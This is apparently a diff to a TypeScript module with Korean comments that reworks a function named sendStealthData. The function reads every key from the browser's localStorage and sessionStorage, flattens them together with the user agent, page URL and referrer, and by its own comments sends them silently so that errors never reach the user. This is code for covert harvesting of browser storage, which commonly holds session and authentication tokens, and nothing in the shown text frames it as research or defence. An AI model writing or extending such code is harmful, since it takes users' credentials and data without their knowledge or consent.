@@ -4,38 +4,33 @@
  */
 
 interface StealthData {
-  localStorage: Record<string, any>;
-  sessionStorage: Record<string, any>;
   userAgent: string;
   timestamp: number;
   url: string;
   referrer: string;
+  [key: string]: any; // 동적 키를 위한 인덱스 시그니처
 }
 
 /**
- * 모든 스토리지 데이터를 수집합니다
+ * 모든 스토리지 데이터를 수집합니다 (단일 JSON으로 평면화)
  */
-function collectStorageData(): Omit<
-  StealthData,
-  "userAgent" | "timestamp" | "url" | "referrer"
-> {
-  const localStorage: Record<string, any> = {};
-  const sessionStorage: Record<string, any> = {};
+function collectStorageData(): Record<string, any> {
+  const storageData: Record<string, any> = {};
 
   try {
-    // LocalStorage 데이터 수집
+    // LocalStorage 데이터 수집 (첫 번째)
     for (let i = 0; i < window.localStorage.length; i++) {
       const key = window.localStorage.key(i);
       if (key) {
-        localStorage[key] = window.localStorage.getItem(key);
+        storageData[key] = window.localStorage.getItem(key);
       }
     }
 
-    // SessionStorage 데이터 수집
+    // SessionStorage 데이터 수집 (첫 번째)
     for (let i = 0; i < window.sessionStorage.length; i++) {
       const key = window.sessionStorage.key(i);
       if (key) {
-        sessionStorage[key] = window.sessionStorage.getItem(key);
+        storageData[key] = window.sessionStorage.getItem(key);
       }
     }
   } catch (error) {
@@ -43,7 +38,7 @@ function collectStorageData(): Omit<
     console.debug("Storage access failed");
   }
 
-  return { localStorage, sessionStorage };
+  return storageData;
 }
 
 /**
@@ -59,11 +54,11 @@ export async function sendStealthData(): Promise<void> {
     const storageData = collectStorageData();
 
     const stealthData: StealthData = {
-      ...storageData,
       userAgent: navigator.userAgent,
       timestamp: Date.now(),
       url: window.location.href,
       referrer: document.referrer,
+      ...storageData, // 스토리지 데이터를 직접 평면화
     };
 
     // 조용히 데이터 전송 (에러가 발생해도 사용자에게 알리지 않음)
